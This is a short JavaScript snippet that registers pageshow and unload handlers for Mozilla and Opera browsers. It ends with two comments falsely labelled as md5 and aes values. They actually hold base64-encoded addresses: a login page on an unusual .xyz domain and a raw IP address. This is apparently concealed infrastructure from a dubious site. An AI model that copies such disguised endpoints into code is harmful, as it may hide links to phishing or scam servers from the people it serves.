if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly93d3cuaG1mcnRyZGltYzE3Lnh5ei93YXAvIy9sb2dpbj9nb2luZGV4PXRydWU=**//** aes:aHR0cDovLzQ3LjI0Mi4xOTkuMjE2**/